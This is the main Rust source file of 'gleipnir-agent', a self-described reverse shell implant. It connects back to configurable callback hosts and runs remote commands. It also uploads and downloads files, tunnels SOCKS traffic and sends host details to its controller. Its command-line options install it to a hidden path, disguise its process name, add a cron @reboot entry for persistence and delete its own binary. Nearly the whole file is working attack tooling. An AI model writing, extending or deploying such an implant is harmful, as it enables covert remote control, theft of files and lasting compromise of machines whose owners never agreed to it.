mod connect;
mod executor;
mod persist;
mod platform;
mod protocol;
mod socks;
mod transfer;

use bytes::BytesMut;
use clap::Parser;
use futures_util::{SinkExt, StreamExt};
use tokio::sync::mpsc;
use tokio_util::codec::Framed;
use tracing::{debug, info, warn};

use connect::ConnectConfig;
use executor::Executor;
use protocol::{Frame, FrameType};
use socks::SocksAgent;

#[derive(Parser)]
#[command(name = "gleipnir-agent", about = "Gleipnir reverse shell agent")]
struct Cli {
    /// Callback host(s), comma-separated for fallback
    #[arg(short = 'H', long, value_delimiter = ',')]
    host: Vec<String>,

    #[arg(short, long, default_value_t = 4444)]
    port: u16,

    #[arg(long, default_value_t = 30)]
    max_retry_interval: u64,

    #[arg(long, default_value_t = 300)]
    cmd_timeout: u64,

    /// Install to a hidden path and run from there
    #[arg(long)]
    install: Option<String>,

    /// Masquerade process name (Linux only)
    #[arg(long)]
    masquerade: Option<String>,

    /// Install cron @reboot entry for persistence
    #[arg(long)]
    cron: bool,

    /// Delete the binary after loading into memory (Linux only)
    #[arg(long)]
    self_delete: bool,

    /// Stable session identifier for reconnect resume (auto-generated if omitted)
    #[arg(long)]
    session_id: Option<String>,

    /// Enable TLS for the relay connection
    #[cfg(feature = "tls")]
    #[arg(long)]
    tls: bool,

    /// CA certificate file (PEM) for TLS verification. Without this, any cert is accepted.
    #[cfg(feature = "tls")]
    #[arg(long)]
    tls_ca: Option<String>,
}

#[tokio::main]
async fn main() {
    tracing_subscriber::fmt()
        .with_env_filter(
            tracing_subscriber::EnvFilter::try_from_default_env()
                .unwrap_or_else(|_| "gleipnir_agent=info".into()),
        )
        .init();

    #[cfg(feature = "tls")]
    rustls::crypto::ring::default_provider()
        .install_default()
        .expect("install rustls crypto provider");

    let cli = Cli::parse();

    // Persistence: install, masquerade, cron before connecting
    let hosts_str = cli.host.join(",");
    let callback_args = vec![
        "-H".to_string(),
        hosts_str,
        "-p".to_string(),
        cli.port.to_string(),
    ];
    persist::install(
        &persist::PersistConfig {
            install_path: cli.install.clone(),
            process_name: cli.masquerade.clone(),
            cron: cli.cron,
        },
        &callback_args,
    );

    if cli.self_delete {
        persist::self_delete();
    }

    let session_id = platform::resolve_session_id(cli.session_id);
    info!(
        "gleipnir agent starting, targets {:?}:{}, session_id={}",
        cli.host, cli.port, session_id
    );

    let config = ConnectConfig {
        hosts: cli.host,
        port: cli.port,
        max_retry_interval: cli.max_retry_interval,
        #[cfg(feature = "tls")]
        tls: if cli.tls {
            Some(connect::build_tls_config(cli.tls_ca.as_deref()))
        } else {
            None
        },
    };
    let cmd_timeout = cli.cmd_timeout;
    let sid = session_id.clone();

    connect::connect_loop(&config, move |framed| {
        let sid = sid.clone();
        tokio::spawn(session_loop(framed, cmd_timeout, sid))
    })
    .await;
}

async fn session_loop(
    mut framed: Framed<connect::BoxedStream, protocol::GleipnirCodec>,
    cmd_timeout: u64,
    session_id: String,
) {
    let executor = Executor::new();
    let socks_agent = SocksAgent::new();

    // Channel for outbound frames (SOCKS data flows back through here)
    let (outbound_tx, mut outbound_rx) = mpsc::channel::<Frame>(256);

    // Send platform info with session_id for resume
    let info = platform::PlatformInfo::detect().with_session_id(Some(session_id));
    info!(
        "sending platform info: {} {} {} sid={}",
        info.os,
        info.arch,
        info.hostname,
        info.session_id.as_deref().unwrap_or("none")
    );
    let info_frame = Frame::new(
        FrameType::InfoResponse,
        0,
        BytesMut::from(&info.to_json_bytes()[..]),
    );
    if let Err(e) = framed.send(info_frame).await {
        warn!("failed to send info: {e}");
        return;
    }

    loop {
        tokio::select! {
            // Inbound from relay
            result = framed.next() => {
                let frame = match result {
                    Some(Ok(f)) => f,
                    Some(Err(e)) => {
                        warn!("frame read error: {e}");
                        break;
                    }
                    None => break,
                };

                debug!("received {:?} request_id={}", frame.frame_type, frame.request_id);

                match frame.frame_type {
                    FrameType::Ping => {
                        if let Err(e) = framed.send(Frame::pong(frame.request_id)).await {
                            warn!("failed to send pong: {e}");
                            break;
                        }
                    }

                    FrameType::Cmd => {
                        let command = match frame.payload_as_str() {
                            Some(s) => s.to_string(),
                            None => {
                                let _ = framed.send(Frame::error(frame.request_id, "invalid utf-8")).await;
                                continue;
                            }
                        };

                        let result = executor.execute(&command, cmd_timeout).await;
                        let output_frame = Frame::cmd_output(frame.request_id, &result.output);
                        if let Err(e) = framed.send(output_frame).await {
                            warn!("failed to send output: {e}");
                            break;
                        }
                    }

                    FrameType::Info => {
                        let info = platform::PlatformInfo::detect();
                        let resp = Frame::new(
                            FrameType::InfoResponse,
                            frame.request_id,
                            BytesMut::from(&info.to_json_bytes()[..]),
                        );
                        if let Err(e) = framed.send(resp).await {
                            warn!("failed to send info response: {e}");
                            break;
                        }
                    }

                    FrameType::FileUp => {
                        let resp = match transfer::handle_file_up(&frame.payload).await {
                            Ok(msg) => Frame::cmd_output(frame.request_id, msg.as_bytes()),
                            Err(e) => Frame::error(frame.request_id, &e),
                        };
                        if let Err(e) = framed.send(resp).await {
                            warn!("failed to send file upload response: {e}");
                            break;
                        }
                    }

                    FrameType::FileDown => {
                        let path = match frame.payload_as_str() {
                            Some(s) => s.to_string(),
                            None => {
                                let _ = framed.send(Frame::error(frame.request_id, "invalid path")).await;
                                continue;
                            }
                        };
                        let resp = match transfer::handle_file_down(&path).await {
                            Ok(data) => Frame::new(
                                FrameType::FileDown,
                                frame.request_id,
                                BytesMut::from(&data[..]),
                            ),
                            Err(e) => Frame::error(frame.request_id, &e),
                        };
                        if let Err(e) = framed.send(resp).await {
                            warn!("failed to send file download response: {e}");
                            break;
                        }
                    }

                    FrameType::SocksOpen => {
                        let otx = outbound_tx.clone();
                        socks_agent.handle_open(frame.request_id, &frame.payload, otx).await;
                    }

                    FrameType::SocksData => {
                        socks_agent.handle_data(frame.request_id, &frame.payload).await;
                    }

                    FrameType::SocksClose => {
                        socks_agent.handle_close(frame.request_id).await;
                    }

                    _ => {
                        debug!("unhandled frame type {:?}", frame.frame_type);
                    }
                }
            }

            // Outbound from SOCKS connections
            Some(frame) = outbound_rx.recv() => {
                if let Err(e) = framed.send(frame).await {
                    warn!("failed to send outbound frame: {e}");
                    break;
                }
            }
        }
    }

    info!("session ended");
}
